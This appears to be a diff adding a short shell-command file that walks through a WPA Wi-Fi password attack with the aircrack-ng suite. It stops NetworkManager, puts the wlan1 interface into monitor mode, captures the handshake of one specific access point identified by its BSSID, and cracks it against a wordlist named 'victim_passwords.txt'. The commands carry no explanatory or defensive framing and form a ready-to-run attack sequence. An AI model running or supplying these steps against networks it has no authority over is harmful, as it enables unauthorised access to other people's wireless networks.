@@ -1,0 +1,18 @@
+systemctl stop NetworkManager
+
+airmon-ng check kill
+
+airmon-ng start wlan1
+
+iwconfig
+
+airmon-ng stop wlan1
+
+airodump-ng wlan1
+
+airodump-ng wlan1 --bssid 70:3A:51:3C:52:56 --channel 13 --write handshake --output-format cap
+
+aircrack-ng handshake-01.cap -w victim_passwords.txt
+
+
+
